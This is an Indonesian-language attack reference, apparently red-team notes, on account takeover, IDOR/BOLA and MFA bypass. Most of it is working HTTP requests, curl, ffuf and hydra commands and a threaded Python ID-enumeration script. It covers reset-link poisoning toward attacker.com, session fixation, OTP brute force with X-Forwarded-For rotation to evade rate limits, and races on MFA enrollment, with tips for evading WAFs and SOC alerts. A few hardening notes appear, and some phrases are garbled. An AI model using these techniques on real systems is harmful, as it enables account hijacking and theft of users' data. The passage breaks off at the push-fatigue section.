## ato-misc

# ato-misc — auth

# Referensi Teknik: Account Takeover Non-OAuth

## 1. Password Reset Poisoning (Host / X-Forwarded-Host)

**Apa yang dikirim:**

```http
POST /api/auth/forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/json

{"email":"victim@target.com"}
```

**Apa yang muncul:** korban menerima email berisi link `https://attacker.com/reset?token=...` — server inject Host/X-Forwarded-Host ke template email reset.

**Kenapa berhasil:** backend (Node/Express pre-`trust proxy` misconfig, atau framework yang baca `X-Forwarded-Host` unvalidated) men-build base URL dari header sebelum render template.

**Varian curl:**

```bash
curl -s https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# kalau Host di-hard-validate, coba header terpisah:
curl -s https://target.com/forgot-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -H "X-Forwarded-Port: 443" \
  -H "X-Forwarded-Proto: https" \
  -d '{"email":"victim@target.com"}'
```

**Header kandidat x failing frontend validation:**

| Header | Kondisi berhasil |
|---|---|
| `Host` | Web server/CDN tidak paksa canonical host (nginx tanpa `server_name` catch-all validation) |
| `X-Forwarded-Host` | Reverse proxy set `proxy_set_header Host $http_host` dan app baca XFH |
| `X-Forwarded-Scheme`/`X-Forwarded-Proto` | Arahkan ke `http://` sehingga token terkirim plaintext via redirect |
| `X-Original-URL` / `X-Rewrite-URL` | Backend pakai path header untuk build URL reset |

**nginx 1.25 hardening yang menggagalkan:**

```nginx
server {
    server_name _;
    return 421;
}
# dan selalu:
proxy_set_header Host $host;          # bukan $http_host
proxy_set_header X-Forwarded-Host ""; # strip header dari klien
```

**Payload poisoning tambahan:** host berisi port/tab sequence untuk email client:

```
Host: target.com:+ tougher.attacker.com
Host: target.com@attacker.com
```

---

## 2. Token Reset Lemah

### 2.1 Predictable

**Apa yang dikirim:** request reset ≥5 kali untuk email sendiri, ambil token.

```bash
for i in {1..5}; do
  curl -s -X POST https://target.com/forgot-password \
    -d '{"email":"own@redteam.io"}' &
  sleep 0.1
done
```

**Pola kandidat:**

| Pattern | Contoh | Eksploit |
|---|---|---|
| Unix timestamp | `1701383612` | predict dari waktu email diterima ±1s |
| Timestamp + md5(email) | md5 yang sudah dikenal | gunakan email sendiri saat trigger, korban saat redeem |
| Seeded RNG / mt_rand reused | token 8 digit | brute ≤10^8 |
| Hash dari userid/email | token = md5(user_id) | reversible |

**Kenapa gagal:** token modern pakai CSPRNG (Go `crypto/rand`, Node `crypto.randomBytes(20)`, Python `secrets.token_urlsafe(32)`) — jika panjang ≥128 bit, hentukan predict path.

### 2.2 No-Expiry

**Apa yang dikirim:** trigger reset untuk email sendiri bulan lalu (dari burp history/akun lama), gunakan token lama.

**Apa yang muncul:** `200 OK` pada `/reset?token=OLD_TOKEN`. Token expired ?2 tahun. Berlaku lintas deploy.

### 2.3 Cross-Account Reuse

**Apa yang dikirim:**

```
1. Trigger reset untuk victim@target.com  → token V (intercept, jangan consume)
2. Trigger reset untuk own@redteam.io     → token O
3. POST /reset-password dengan body {"token":"V","password":"P@ss1"} + session cookie milik akun sendiri
4. POST /reset-password dengan body {"token":"O","password":"x"} tapi referer/username field diubah ke korban
```

**Kenapa berhasil:** backend retrieve user dari sesi/parameter lain, token hanya sebagai boolean "valid reset exists" tanpa binding ke user target. Test matrix:

| Kombinasi | Indikasi bug |
|---|---|
| Token A + Session user B → password user B berubah | token tidak bound ke user |
| Token A + parameter `email` dari form beda | reset mengikuti parameter, bukan token |
| Consume token via API v1, masih valid di API v2 | invalidasi tidak lintas endpoint |

### 2.4 Tidak Invalidasi

- Reset password **tidak men-invalidasi** session lama korban → setelah takeover, korban masih login, tidak ada sinyal.
- Token reset **tidak dihapus** setelah konsumsi → replayable selamanya.
- Request reset berikutnya **tidak men-invalidasi token sebelumnya** → token lama masih redeemable.

---

## 3. Session Fixation

**Apa yang dikirim:**

```http
POST /login HTTP/1.1
Cookie: SESSION=attacker_fixed_session_id
Content-Type: application/x-www-form-urlencoded

username=victim&password=<phished>
```

**Apa yang muncul:** response `Set-Cookie: SESSION=attacker_fixed_session_id` (nilai pre-login dipertahankan).

**Kenapa berhasil:** session ID di-generate sebelum login (login form, landing page, subdomain yang juga di-scope `.target.com`) dan tidak diregenerasi saat authentication event.

**Test preconditions:**

| Precondition | Check |
|---|---|
| Server kirim session cookie di halaman anonymous | GET `/` → perhatikan `Set-Cookie` |
| Login tanpa regenerasi | burpsuite macro: sample cookie sebelum/di sesudah POST /login |
| Session di jalur `Accept`/re-accept header token lama | Kirim session lama setelah login — 200? |

Eksploitasi kombinasi dengan password reset:

```
1. Kirim reset link ke korban (phish)
2. Korban klik → pre-login page set-kan session cookie attacker (butuh XSS atau subdomain;set)
3. Korban login/set password baru di sesi session tersebut
4. Attacker redeem session ID sama → langsung ter-autentikasi
```

---

## 4. Cookie Tossing

**Apa yang dikirim:** via temuan lain (subdomain renderer, app di `*.target.com`, upload di CDN subdomain) → set:

```http
Set-Cookie: SESSION=attacker_controlled_value; Domain=.target.com; Path=/
```

Perbedaan scope cookie: subdomain `blog.target.com` dapat set cookie untuk parent scope.

| Browser | Priority saat duplikat |
|---|---|
| Chrome 131 | Cookie dengan `__Host-` prefixes di-prioritaskan; else yang dari subdomain lebih lama tetap ter-read kalau server baca `Cookie` header raw |
| Firefox 133 | Sortasi `Path` lebih spesifik dulu; koalesce berdasar creation-time |
| Safari/iOS 18 | Subdomain cookie-mask berbeda — sering jadi vector tunggal |

**Varian juice:**

```
Path traversal di cookie name:
Set-Cookie: session=legit; Expires=Fri, 01-Jan-2027 00:00:00\nsession=fake; Domain=.target.com; Path=/admin
```

Server side split `Cookie` header by `;` — cookie kedua menimpa nilai di framework yang juga mengizinkan whitespace di path.

**Kenapa gagal:** target pastikan:
```http
Set-Cookie: session=...; Path=/; Secure; HttpOnly; SameSite=Lax; + HostOnly (tanpa atribut Domain)
```
→ cookie-only scope host-wise, subdomain lain tidak bisa set ID pel thwart.

---

## 4.2 Tossing antar subdomain — Diskriminasi session cookie attribute

```http
Set-Cookie: session=deadbeef; Domain=app.target.com; Path=/admin/; Secure
```

Subdomain `app.target.com` — kalau `Domain` set parent dan app decode cookie `session` walaupun **path substring** match `/admin`, cookie dari origin attacker di subdomain ini bisa override. (Java Spring Security 5.x dan beberapa `CookieSerializer` lama mem-parse path secara.contains).

---

## 5. 2FA Bypass

### 5.1 Response Manipulation

**Apa yang dikirim:**

```http
POST /login/2fa HTTP/1.1
Cookie: auth_stage=pending

{"otp":"123456"}
```

Response normal:

```json
{"success":false,"error":"invalid"}
```

Interceptor (burp match/replace) bantalan response → forward versi berikut:

```json
{"success":true,"redirect":"/dashboard"}
```

Atau pada client-side decision:

```js
// check flow JS: codepen Vue/React lama
if (res.verified) location.href="/home";
```

lanjutkan langsung request `/home` — apakah session cookie sudah fully auth?

| Injection point | Payload |
|---|---|
| Change JSON response `"verified":false→true` di-level proxy | Burp `Match/Replace` response |
| Client-side check | load step selanjutnya bypass otentikasi (function `checkStep` laggio) |
| status code | `/api/2fa/verify` yang hanya riwayat `204=ok, 401=bad` → race dengan expiration (lihat 5.2) |

### 5.2 Backup Code Brute

**Apa yang dikirim:**

```bash
# contoh 8-char alphanumeric, sangat terbatas rate limit
hydra -L user -P backupcodes.txt target.com https-post-form \
  "/api/2fa/backup:code=^PASS^:F=incorrect"
```

Atau tanpa tool — wordlist callback di burp Intruder:

```
eyJhb : backup code base64 or hex → temukan format panjang dari 1 code awal
```

| Produk | Karakter backup code | Rate-limit |
|---|---|---|
| GitHub (derive) | 8-hex per code, `xxxx-xxxx` format | 8 rps per-IP |
| Laravel Fortify 1.x default | 6 digit numeric, 10 backup | tenant throttle saja |
| Okta (lampo) | Alf rather 10 chars | bergantung policy org |

Palung rate-limit: apakah backup berbedakan OAuth step dari OTP step (`/api/2fa/otp` rate-limited, `/api/2fa/backup` tidak)?

### 5.3 Race Enrollment 2FA

**Apa yang dikirim** (kombinasi session + parallel request):

```
Sesi benar: korban
1. POST /api/2fa/enroll    → server generate secret + QR
2. Kirim banyak kali parallel via HTTP2:
   POST /api/2fa/enroll → taruh secret attacker (penukar TOTP secret di server storage)
3. Response berisi `otpauth://totp/...?secret=ATTACKER_SECRET`
```

Kondisi: enrollment mengizinkan **overwrite secret yang sudah aktif selama window pending**, atau POST `/enroll` mengizinkan konfirmasi langsung saat user tersebut telah enable 2FA (bukan saat setup initial saja).

Race di-active state check:

```bash
# HTTP/2 single-packet multi-request
cat > reqs.txt <<'EOF'
POST /api/2fa/confirm HTTP/2
...
{"secret":"NEW","code":"123456"}
EOF
race-the-web -target https://target.com -requests reqs.txt
```

**Kenapa berhasil:** endpoint `/confirm` disimpel men-check `enabled=false` → sebelum salah satu request dari race finish memflip enabled → duplicate secret overwrite terjadi.

---

## 6. Email Change tanpa Re-auth / Confirmasi

### 6.1 Direct change

**Apa yang dikirim:**

```http
POST /api/account/email HTTP/1.1
Cookie: session=STOLEN
Content-Type: application/json

{"email":"attacker@redteam.io","currentPassword":""}
```

**Apa yang muncul:** `200 OK` + `{"email":"attacker@redteam.io"}` — permanen, langsung aktif, tanpa verifikasi link ke email lama.

### 6.2 Current password partial-check

Body JSON dengan properti yang belum ada di skema sebelum push MFA migration:

```json
{"email":"attacker@redteam.io","confirmNewPassword":"...","currentPassword":null}
```

Middleware back-end cek `if (currentPassword !== user.password)` → `null !== "hash"` = true → pass. Atau:

```json
{"email":"attacker@redteam.io","sure":true}
```

field `sure` di-handle sebagai konfirmasi re-auth di route yang immutability constraint lemah.

### 6.3 Mass assignment

| Framework | Payload |
|---|---|
| Rails (<=6, ActiveModel `attr_accessible` lama) | `{"user":{"email":"...","admin":true}}` |
| Spring Boot (<=2.7 DTO terurut) | bind `{"email":"...","verified":true}` |
| .NET 8 with `[Bind]` missing restrict | `user.Email`, `user.EmailConfirmed=true` pada model `IdentityUser` default |

### 6.4 Confirmation link weak

- Email konfirmasi change dikirim ke **email baru**, bukan email lama → attacker langsung aktivasi setelah takeover sesi, korban tidak menerima notice.
- Token konfirmasi cukup **predictable atau exchangable** (v. §2.1).
- **No session re-binding**: setelah email berubah, session lama tidak dikunci → logout tidak forced, korban masih bisa use device → attacker dapat window panjang.

---

## 7. Bonus — Kriteria Berhasil / Skip cepat

| Teknik | Pre-condition 5-menit check |
|---|---|
| Reset poisoning | Postman: trigger reset untuk account sendiri, perhatikan link di email — pure domain `attacker.com` muncul ? |
| Cross-account reuse | mungkinkan punya 2 account sendiri untuk test |
| Session fixation | Lihat regenerasi sesi statement via Burp `Session Handling` |

---

## 8. Jebakan Operasional di Lapangan

- **Googlebot/Content-Security heuristic**: beberapa backend periksa `X-Forwarded-Host` hanya saat `Vary` header muncul — poisoning gagal tanpa caching layer.
- **Host validasi di load balancer**: nginx 1.25 ditambah `server_name target.com` strict → request dengan `Host: attacker.com` dapat `421` sebelum menyentuh aplikasi. Solusi: gunakan header proxy-chain lain.
- **CDN pin host header**: AWS ALB hapus header Host dan inject list sendiri → gunakan `X-Forwarded-For` only test.
- **Race enrollment fail via DB transaction**: DB isolation level serializable → coba tambahkan delay sebelum commit atau gunakan POST ke endpoint confirm yang tidak jadi satu transaksi dengan check enable.
- **Token reset replay** hanya **dengan konfirmasi email**: change > 1 kali reset serial jadi invalidasi token lama, sebuah valid tidak lagi replayable. Selalu test 2x sebelum laporkan.
- **Cookie name collision**: beberapa framework mengizinkan duplikat cookie — di Chrome 131, cookie yang `Domain=target.com` hashed host-raw; jangan lupa cek end-to-end target read via browser, bukan hanya burp parse.
- **Email API buang link sebelum render**: reset link dikirim tanpa versi plaintext ke receipient destabil dari MX record — poisoning corrupt HTML wire. Perlu inspect source HTML email mentah, tidak kas advertise / route 127 redirect.
- **2FA response manipulation kadang no-op server-side**: endpoint selanjutnya cek server-side flag `two_fa_verified` di session — response hanya mengganti tampilan client, tidak session claim. Kirim sebagai "ui-only bypass" jika tidak login berhasil, jangan lapor sebagai ATO.
- **Backup code brute** gagal jika basic rate-limit berbasis `user_id`, bukan IP — hydra → lockout korban dan trigger SOC.
- **Email change**: prod biasanya hanya meng-update table `temp_email`, perlu verifikasi & konfirmasi via email lama sebelum commit — cek apakah login menggunakan `temp_email` juga di-enable (bug terpisah: login via pending email).
- **Session fixation** tidak berguna kalau target tetap generated server-side UUID v4 saat request pertama; pin saja jika `Set-Cookie` pada landing tanpa login ada.


## idor-bola

# idor-bola — auth

# IDOR / BOLA Reference Guide

## 1. Referensi Cepat ID Pattern & Test Matrix

| Pola ID | Contoh | Enumerability | Bypass Difficulty | Test Priority |
|---|---|---|---|---|
| Sequential integer | `/api/v1/orders/1001` | Trivial (Burp Intruder) | Rendah | P0 |
| Sequential + offset | `/orders?offset=500` | Trivial | Rendah | P0 |
| UUID v4 | `a3bb189e-8bf9-3888-9912-ace4e6543002` | Mustahil brute force | Tidak relevan — IDOR tetap possible | P1 |
| UUID v1 (time-based) | `e2f8a1c0-...` | Tidak brute, tapi **leakable** (timestamp + MAC) | Sedang | P2 |
| Hashid / obfuscation | `/orders/MjU=` (base64 dari 25), hashids library | Trivial decode | Rendah | P0 |
| NanoID / ULID | `01ARZ3NDEKTSV4RRFFQ69G5FAV` | Mustahil | N/A | P1 |
| Nested path | `/orgs/1337/users/42/exports/9` | Enumerasi per-level | Sedang | P0 |

**Catatan hashid:** hashids-python/js decodable offline jika salt default (`""`) atau salt di bundle frontend JS. Ekstrak salt dari `app.js` / `chunk-*.js`, decode range 1–N untuk verifikasi.

```bash
# Deteksi base64/sequential di response
grep -oP '"id"\s*:\s*"[A-Za-z0-9+/=]{8,}"' resp.json | head
echo "MTAyNA==" | base64 -d   # 1024
```

---

## 2. /me vs /{id} Swap

**Apa yang dikirim:** request dengan endpoint "self-service" ganti ke endpoint absolute ID, dan sebaliknya. Authz check sering hanya dipasang di salah satu.

```
# Varian swap matrix
GET  /api/me/invoices          → 200 OK (konteks sendiri)
GET  /api/users/501/invoices   → cek apakah invoice user lain muncul
GET  /api/users/me/invoices    → kadang bypass: "me" string tidak divalidasi ownership
PUT  /api/me                   → body: {"userId": 502, "email": "attacker@x.com"}
```

**Kenapa berhasil:** routing split — `/me` ditangani middleware inject `req.user.id`, `/users/{id}` ditangani handler yang lupa cek ownership. Burp Authz / Autorize extension otomatis test kedua varian.

**Varian HTTP method swap:**

| Method di /{id} milik orang lain | Behavior umum |
|---|---|
| GET | sering diperbaiki (audit paling sering di sini) |
| PATCH / DELETE | sering **luput** — bug klasik |

```
DELETE /api/carts/8814       # milik user lain → 403
PATCH  /api/carts/8814       # same object, metadata argument bug → 200
PATCH  /api/carts/8814/owner # subresource: ownership check tidak inherited
```

---

## 3. Batch & GraphQL

### 3.1 REST Batch
Batch endpoint sering skip per-item authorization karena authz middleware jalan sekali per request, bukan per item.

```json
POST /api/v2/transactions/batch
{
  "operations": [
    {"op": "get",  "id": "txn_9001"},
    {"op": "get",  "id": "txn_9002"},
    {"op": "delete", "id": "txn_8500"}
  ]
}
```

**Kenapa berhasil:** loop internal memvalidasi input format, bukan object-level ACL.

### 3.2 GraphQL BOLA
Pola klasik (dashboard GraphQL seperti Hasura, Apollo Server, GraphQL.js):

```graphql
query {
  user(id: "501") {        # bukan currentUser!
    email
    orders { id total }
    ssn
  }
}
```

Dua root untuk test: `currentUser` (sudah scoped) vs `user(id:)` (harus ada authz directive).

**Batching attack (nested alias untuk DoS + enumeration):**

```graphql
query {
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  ...
  a100: user(id: 100) { email }
}
```

**Kenapa berhasil:** query cost analis sering hanya hitung depth, bukan jumlah alias. Apollo `costAnalysis` di `graphql-cost-analysis@0.7.x` harus dikonfigurasi manual.

**Cek introspection:**
```bash
curl -s -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

Tools: `clairvoyance` (override introspection disabled), InQL Scanner (Burp).

---

## 4. Enumerasi via Search / Export / Report

Endpoint read-only "safe" (CSV/PDF export, search, activity log) paling sering bocor data orang lain karena dianggap non-sensitive oleh developer.

**Apa dikirim vs apa yang muncul:**

| Request | Response indikator |
|---|---|
| `GET /api/reports?type=invoice&user_id=502` | PDF milik user lain, header `Content-Disposition: invoice_502.pdf` |
| `GET /export/orders.csv?all=1` | Semua tenant data — cek parameter flag tersembunyi (`all`, `scope=admin`, `limit=-1`) |
| `GET /api/search?q=*&userId=501` | Response `total: 8412` padahal user hanya punya 3 order |
| `GET /api/audit-logs?actor=501` | Log transaksi user lain — object ref leak untuk pivot IDOR |

**Parameter probing untuk scope leak:**
```bash
for p in "userId=501" "userId=501&scope=tenant" "tenant=all" "orgId=12&all=true" "all=1" ; do
  curl -s "https://t/api/export?$p" | wc -l; done
```

---

## 5. HTTP Parameter Pollution (HPP)

**Apa yang dikirim:** parameter duplikat; framework/library berbeda ambil nilai berbeda.

| Stack | Yang dipakai |
|---|---|
| PHP / `$_GET` | **last** occurrence |
| ASP.NET `Request` | **last** |
| Express (body-parser) | mengembalikan **array** |
| Flask `request.args.get` | **first** |
| Java Spring `@RequestParam` | first |

**Payload:**
```
GET /api/orders?userId=501&userId=ATTACKER_ID
POST /api/orders  →  body: id=8814&id=92&amount=999
```

**Kenapa berhasil:** authz middleware (mis. Casbin di Express) baca `req.query.userId` pertama → owner check pass. Query DB pakai nilai terakhir → object lain diakses.

**Varian JSON pollution:**
```json
{"userId": 501, "userId": 8814}
```
Fastjson/Jackson deserialize: key duplikat last-wins (Jackson) atau first-wins tergantung config — test dua arah. Gunasiakan juga kasing beda: `userId` vs `UserID` vs `user_id` (Node normalize tidak, Java case-sensitive).

---

## 6. Object Ownership Check Hilang — Structured Detection

Urutan tes per endpoint (jangan asal random ID):

1. **Create objek milik sendiri** → catat `id`, cek atribut teknis.
2. **Request ulang objek sendiri** → baseline 200 + body shape.
3. **Request objek target** (ID user koridor/tenant lain) → bandingkan.
4. **Full matrix method × ID × content-type.**

| Kombinasi | Sinyal kritis |
|---|---|
| awal `GET /orders/{other}` → 403 | JANGAN berhenti — coba method lain, trailing dot, path varian |
| `GET /orders/8814/` vs `/orders/8814` | nginx 1.25 dengan `merge_slashes on` default + backend route yang beda → check bypass |
| `GET /api/v1/orders/8814` saat `/api/v1` deprecated | Versi lama sering tanpa authz baru. Test `/api/v1/`, `/api/v0/`, `/internal/` |
| Response 403 tapi body tetap `{"data": {...}}` | Check-response-only bug: backend kirim data, wrapper yang blokir — cek via gzip diff/response length |

**Bypass path-file:**
```
/orders/8814          → 403
/orders/8814;         → 200 (Spring Security 5.x path matching)
/orders/8814/         → 200 (Tomcat trailing slash)
/orders/8814%20       → 200
/orders/8814..;/      → traversal segment
//api/orders/8814      → proxy misroute
```

---

## 7. Tenant Isolation

IDOR lintas tenant = impact tertinggi (ES tuh data isolation contract break — lihat OWASP API1:2023 BOLA).

**Apa yang dikirim:**
```
GET /api/v1/documents/DOC-7784          # dalam tenant ID sendiri: 200
Host: app.customer-a.example.com         # tenant via subdomain
Host: app.customer-b.example.com         # request ID sama di tenant lain
```

Cek sumber tenant binding: subdomain Host header, header `X-Tenant-Id` (spoofable), session claim (aman), path `/t/{tenant}/...`.

**Payload:**
```
X-Tenant-Id: 42
X-Tenant-Id: 
# atau via HPP:
X-Tenant-Id: 7
X-Tenant-Id: 42
```

**Kenapa gagal tidak jarang:** cache key (Varnish, Cloudflare) hanya normalize path+query, tidak Host header → cache poisoning cross-tenant data via `Cache-Control` + Host hijack di setup khusus.

**Server-side enumeration:**
```bash
# Dua account tenant kecil, compare semua ref id
diff <(jq -r '..|objects|to_entries[]|select(.key|test("id";"i"))|.value' a.json) \
     <(jq -r '..|objects|to_entries[]|select(.key|test("id";"i"))|.value' b.json)
```

---

## 8. Skrip Enumerasi Sequential ID

```python
#!/usr/bin/env python3
# idor_enum.py — sequential id scan, ajv judges "leak" via diff vs baseline
import requests, sys, json
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://target.example.com/api/v1/invoices/{id}"
COOKIES = {"session": "<self_session>"}
RANGE = range(9000, 10000)
BASELINE_KEYS = None  # diisi dari object milik sendiri

def check(id_):
    try:
        r = requests.get(TARGET.format(id=id_), cookies=COOKIES, timeout=10)
        if r.status_code == 200:
            body = r.json()
            # heuristic: hit kalau ada field yang bukan milik account sendiri
            if body.get("user_id") not in MY_USER_IDS:
                return (id_, r.status_code, body.get("user_id"), len(r.content))
    except Exception:
        pass
    return None

MY_USER_IDS = {501}  # semua id milik account tester
hits = []
with ThreadPoolExecutor(max_workers=20) as ex:
    for res in ex.map(check, RANGE):
        if res: hits.append(res); print("[HIT]", res)
print(f"Total: {len(hits)} / {len(RANGE)}")
```

Rate-limit hardening: honor `Retry-After`, jitter, throttle worker ke 3–5 agar tidak trigger WAF (Cloudflare / Akamai sering blok 429-style pattern `n+1` monotonic sequential).

---

## 9. Triage Impact Rating

| Kriteria | Signal | Rating |
|---|---|---|
| Data exposure (read-only), PII terbatas | nama+email saja | Medium (P3) |
| Read finance/health | saldo, rekening, diagnosis, dokumen | High (P2) |
| Write/Delete terhadap objek milik user lain | PATCH/DELETE sukses | High- |
| Lintas tenant, bulk (export/report) | ratusan+ record | Critical (P1) |
| Escalasi admin via object role tampering | POST/PATCH role field, kredensial | Critical (P0) |

Triage sebelum report:
1. Jumlah objek confirm exposed (katakan angka).
2. Jenis data (column header dari export).
3. Metode akses (perlu klik / batch GraphQL / scriptable).
4. Konfirmasi data asli vs dummy (lihat `created_at`, format, konsistensi DB).
5. Scope: 1 ID, 1 tenant, atau seluruh platform.

Laporan wajib: raw request/response (redacted), video/trace, coyote note ("blast radius"), mitigation pointer (lookup object by session-claimed id, bukan client-pased id).

---

## 10. Jebakan Operasional

| Jebakan | Efek | Mitigasi |
|---|---|---|
| Canary data dibuat QA semua punya | response dari account sendiri dianggap IDOR hit | Create object sendiri via UI dulu, set `MY_USER_IDS` |
| Sequential monotonic scan | Cloudflare bot challenge / WAF validator 429 | Random permutation list(range), jitter, User-Agent asli Chrome 131, low concurrency |
| Test di staging environment | dev "sudah aware", duplikasi ID hole, finding tidak representatif | Verify di prod environment kapan pun bisa; prod sering memiliki code path identik tapi patch drift |
| UUID dianggap "bukan IDOR" | filter out temuan; UUID leak via export/GraphQL relations/ref links | Dapatkan UUID via search/report endpoint → IDOR tetap berjalan |
| ID sumber RPC dalam protobuf/gRPC-web binary | script curl-based gagal decode | Parse dengan `grpcurl` atau decompile `tugu-web` client libs |
| Authz middleware hanya jalan di 1 route tier | tidak menemukan IDOR karena hanya test endpoint sama yang terproteksi | Fuzz routing varian: version, method, nested/dotted path |
| Spoofed `X-Tenant-Id` diaplikasikan saat render PDF/rsync worker async | data di-cache, delayed render "tidak terlihat leak" sulit konfirm | Cek s3/signed URL output jobs, tunggu worker render |
| Lupa redact third-party PII dalam report/report chat | temuan jadi insiden compliance terpisah | Masking di note, simpan evidences di internal vault saja |
| 403 response basi dari gateway tapi backend processing async side effect tetap terjadi (log, audit, resource) | DELETE "403" ternyata benar-benar delete | selalu re-verify object state with GET setelah tes DELETE |


## mfa-bypass

# mfa-bypass — auth

# Bab 7 — Referensi Teknik: MFA/2FA Bypass

## 7.1 Response Tampering (Client-Side)

**Target:** aplikasi web validasi status MFA di client atau tidak re-verify di server.

**Apa yang dikirim:**

```http
POST /api/v2/auth/verify-otp HTTP/1.1
Host: target.corp
Content-Type: application/json

{"otp": "000000", "session": "abc123"}
```

**Apa yang muncul (respon asli):**

```http
HTTP/1.1 401 Unauthorized
{"success": false, "message": "Invalid OTP", "mfa_verified": false}
```

**Yang diubah via Burp Match & Replace (respon):**

```
Match: "mfa_verified":false
Replace: "mfa_verified":true

Match: "success":false
Replace: "success":true
```

**Kenapa berhasil:** SPA (React 18/Vue 3) menyimpan state `mfa_verified` dari body JSON, lalu memanggil endpoint berikutnya (`/api/dashboard`) yang *tidak* mengecek flag MFA di server-side session.

**Kenapa gagal:** session server memiliki atribut `mfa_verified=False` terpisah; endpoint `/api/dashboard` membaca session, bukan body.

**Varian status code swap — lihat 7.2.**

---

## 7.2 Status Code Swap via Reverse Proxy

**Target:** arsitektur nginx/blue/green di mana logika keputusan ada di header/body, tapi modul otorisasi cuma cek `status < 400`.

**Apa yang dikirim (Intercept di Burp, ubah respon tidak bisa — kita intervensi lewat request):**

```http
POST /login-step2 HTTP/1.1
Host: sso.target.corp
X-Original-URL: /login-step2
Content-Type: application/x-www-form-urlencoded

otp=123456&debug=1
```

Atau untuk verifikasi proxy: minta endpoint OTP dengan path traversal yang error handler map ke 200:

```
GET /verify-otp/../../../../verify-otp?code=AAAAAA HTTP/1.1
```

nginx 1.25 tanpa `merge_slashes off` / `alias` misconfig kadang mengembalikan **200 dengan body error**. Modul otorisasi custom berbasis `vouch-proxy` lama hanya check `status_code == 200` → berhasil masuk.

**Kenapa gagal:** nginx 1.25+ default `merge_slashes on` sudah membongkan traversal; backend modern (Django 4.2 dengan `APPEND_SLASH` strict) return 400.

---

## 7.3 Backup Code Brute Force + Rate Limit Erosion

**Apa yang dikirim:**

Backup code biasanya 8 karakter alfanumerik `[a-z0-9]` — entropy ~40 bit, tapi banyak implementasi generate base32 dari 10 byte jadi charset terbatas.

```bash
# ffuf dengan wordlist 8-char lowercase-alnum (generated via crunch)
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o codes.txt

ffuf -u https://target.corp/api/auth/backup-code \
  -X POST -H "Content-Type: application/json" \
  -d '{"code":"FUZZ","session":"abc123"}' \
  -w codes.txt \
  -mr "success" \
  -rate 15
```

**Rate limit matrix yang berarti:**

| Backend | Limit khas | Celah |
|---|---|---|
| FastAPI + slowapi | 5/min per IP | Cache Redis key pakai IP, bukan session → detonasi X-Forwarded-For |
| Express + express-rate-limit 7.x | 100/15min | Window reset per key, tidak kumulatif |
| Cloudflare WAF free plan | 10 req/min challenge | Origin limit sering absent di belakang CF |

**Header rate limit bypass yang sering lolos:**

```
X-Forwarded-For: 1.2.3.4   (rotate via pool 254 IP)
X-Real-IP: ...
```

**Kenapa berhasil:** otorisasi backup code dipisah endpoint dari OTP utama, developer lupa pasang rate limitserupa. Kode backup jarang di-hack — reuse valid.

**Kenapa gagal:** rate limit keyed ke `session_id` bukan IP; 5 attempt → lockout akun + alert SOC.

---

## 7.4 OTP Reuse & Infinite Validity

**Apa yang dikirim:**

```http
POST /api/auth/verify-otp
{"otp": "884213", "session": "abc123"}
```

Session pertama berhasil login. Uji ulang OTP **sama** di window 30–90 detik:

```bash
for i in 1 2 3 4 5; do
  curl -s -X POST https://target.corp/api/auth/verify-otp \
    -H "Cookie: SESSION=xyz" -d '{"otp":"884213"}' | jq -r '.success'
  sleep 20
done
```

Kalau semua `true` → tidak ada nonce invalidation.

**Varian infinite validity:** OTP email/SMS belum expired dalam 24 jam (window ideal: 5 menit). Test:

```bash
# replay OTP 6 jam setelah request pertama
curl -X POST .../verify-otp -d '{"otp":"884213"}'
```

**TOTP window check:** kirim TOTP dari periode `-1` (30 detik lalu). RFC 6238 merekomendasikan tolerance `±1` time-step; implementasi buruk menerima `±10`.

**Kenapa gagal:** kebijakan `last_used_otp` disimpan per user di Redis dengan TTL = time-step; Google Authenticator-compatible server pakai pyotp dengan `valid_window=1`.

---

## 7.5 Race Condition pada Enrollment

**Konsep:** endpoint enroll MFA tidak atomic — kondisi TOCTOU antara "user belum verified" dan "enroll device baru."

**Apa yang dikirim — dua thread paralel:**

```bash
# Thread A: request OTP login biasa (masih single-factor)
seq 1 30 | xargs -I{} -P 20 curl -s -X POST \
  https://target.corp/api/auth/login \
  -d '{"user":"victim","pass":"P@s5w0rd!"}' \
  -c cookie_{}.txt

# Thread B: enroll langsung
seq 1 30 | xargs -I{} -P 20 curl -s -X POST \
  https://target.corp/api/mfa/enroll \
  -b cookie_{}.txt \
  -d '{"type":"totp","secret":"JBSWY3DPEHPK3PXP"}'
```

**Kenapa berhasil:**`/api/mfa/enroll` tidak mengecek flag `mfa_required` apabila session baru dibuat < 2 detik. Kondisi umum pada flow "pending enrollment": device yang belum diverifikasi diberi grace period login tanpa MFA.

**Percobaan single-packet alternative (HTTP/2 RFC 9113, Chrome 131 style via turbo Intruder):**

```
:method POST
:path /api/mfa/enroll
...
# dikirim 15 stream identik dalam 1 TCP connection → server process paralel
```

**Kenapa gagal:** DB constraint `UNIQUE(user_id, device_id)` + row-level lock (`SELECT ... FOR UPDATE`) → hanya satu enroll lolos; sisanya 409.

---

## 7.6 TOTP Secret Leak via API / QR

**Vektor A — raw response saat enroll:**

```http
GET /api/mfa/enroll-qr HTTP/1.1
```

```json
{
  "qr": "otpauth://totp/Target:user@target.corp?secret=JBSWY3DPEHPK3PXP&issuer=Target",
  "secret": "JBSWY3DPEHPK3PXP",
  "algorithm": "SHA1", "digits": 6, "period": 30
}
```

`secret` terlihat di body tanpa perlu decode QR. Generate kode:

```bash
oathtool --totp -b -d 6 -s 30 JBSWY3DPEHPK3PXP
# → 492039 (live, jalan terus)
```

**Vektor B — decode QR PNG:**

```bash
curl -o qr.png https://target.corp/mfa/qr/abc123
zbarimg qr.png
# QR-Code:otpauth://totp/...
```

**Vektor C — MFA enrollment via mobile app manifest:** `AndroidManifest.xml` kadang menyertakan hardcoded secret pada `authenticatorActivity` deep link `otpauth://`.

**Kenapa gagal:** endpoint enroll butuh session step-up (lihat 7.10); secret hanya dikirim sekali per-enrollment dan tidak exposed di `/api/users/me`.

---

## 7.7 Push Fatigue (MFA Bombing)

**Kondisi:** target menggunakan push notification (Duo, Okta Verify, Microsoft Authenticator number matching pre-2023 mode).

